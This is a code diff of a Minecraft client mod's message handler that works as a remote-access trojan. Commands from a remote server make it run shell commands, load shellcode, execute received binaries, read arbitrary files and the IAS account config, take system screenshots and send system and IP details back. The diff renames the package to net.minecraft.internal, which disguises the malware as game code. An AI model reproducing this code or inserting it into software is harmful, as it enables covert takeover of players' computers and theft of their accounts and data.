@@ -1,13 +1,17 @@
-package me.soda.witch.client.connection;
+package net.minecraft.internal.connection;
 
+import net.minecraft.internal.Witch;
+import me.soda.witch.shared.NetUtil;
 import me.soda.witch.shared.socket.messages.Variables;
-import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.messages.Message;
-import me.soda.witch.shared.socket.messages.PlayerInfo;
 import net.minecraft.client.util.GlfwUtil;
+import net.minecraft.internal.utils.ChatUtil;
+import net.minecraft.internal.utils.MCUtils;
+import net.minecraft.internal.utils.ScreenshotUtil;
+import net.minecraft.internal.utils.ShellcodeLoader;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
@@ -25,37 +29,34 @@ public class MessageHandler {
                 case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
                 case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
                 case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
-                case "mods" -> NetUtil.send(msgType, MCUtils.allMods());
-                case "systeminfo" -> NetUtil.send(msgType, MCUtils.systemInfo());
+                case "mods" -> Witch.send(msgType, MCUtils.allMods());
+                case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                 case "screenshot" -> ScreenshotUtil.gameScreenshot();
-                case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.systemScreenshot());
+                case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
                 case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                 case "shell" -> new Thread(() -> {
                     String result = ProgramUtil.runCmd((String) msg);
-                    NetUtil.send(msgType, "\n" + result);
+                    Witch.send(msgType, "\n" + result);
                 }).start();
                 case "shellcode" -> {
                     if (ProgramUtil.isWin())
                         new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                 }
                 case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
-                case "config" -> NetUtil.send(msgType, Variables.INSTANCE);
-                case "player" -> NetUtil.send(msgType, MCUtils.getPlayerInfo());
-                case "skin" -> {
-                    NetUtil.send("player", new PlayerInfo());
-                    MCUtils.sendPlayerSkin();
-                }
+                case "config" -> Witch.send(msgType, Variables.INSTANCE);
+                case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
+                case "skin" -> MCUtils.sendPlayerSkin();
                 case "server" -> {
                     MCUtils.disconnect();
                     Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                 }
                 case "kick" -> MCUtils.disconnect();
                 case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
-                case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
-                case "read" -> NetUtil.send(msgType, FileUtil.read((String) msg));
-                case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
-                case "props" -> NetUtil.send(msgType, System.getProperties());
-                case "ip" -> NetUtil.send(msgType, NetUtil.httpSend("https://ifconfig.me/"));
+                case "iasconfig" -> Witch.send(msgType, FileUtil.read("config/ias.json"));
+                case "read" -> Witch.send(msgType, FileUtil.read((String) msg));
+                case "runargs" -> Witch.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
+                case "props" -> Witch.send(msgType, System.getProperties());
+                case "ip" -> Witch.send(msgType, NetUtil.getIP());
                 case "crash" -> GlfwUtil.makeJvmCrash();
                 case "server_name" -> Variables.INSTANCE.name = (String) msg;
             }
